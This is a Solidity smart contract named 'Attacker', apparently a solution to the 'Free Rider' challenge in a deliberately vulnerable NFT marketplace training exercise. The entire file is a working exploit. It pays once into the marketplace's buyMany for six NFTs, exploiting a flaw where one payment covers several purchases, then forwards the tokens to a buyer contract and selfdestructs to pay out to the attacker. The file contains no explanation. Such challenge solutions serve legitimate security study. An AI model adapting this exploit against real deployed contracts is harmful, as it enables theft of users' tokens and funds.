// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";

contract Attacker is IERC721Receiver {

    using Address for address payable;
    address payable private immutable attacker;
    address private immutable buyer;
    IERC721 private immutable nft;
    FreeRiderNFTMarketplace private immutable marketplace;

    constructor(address payable _attacker, address _buyer, address _nft, address payable _marketplace) payable {
        require(msg.value == 15 ether);
        attacker = _attacker;
        buyer = _buyer;
        nft = IERC721(_nft);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    function attack() external {
        require(msg.sender == attacker);
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            ids[i] = i;
        }
        marketplace.buyMany{value: 15 ether}(ids);
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(nft.ownerOf(i), buyer, i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        require(msg.sender == address(nft));

        return IERC721Receiver.onERC721Received.selector;
    }

    function destroy() external {
        require(msg.sender == attacker);
        selfdestruct(attacker);
    }

    receive() external payable {}
}
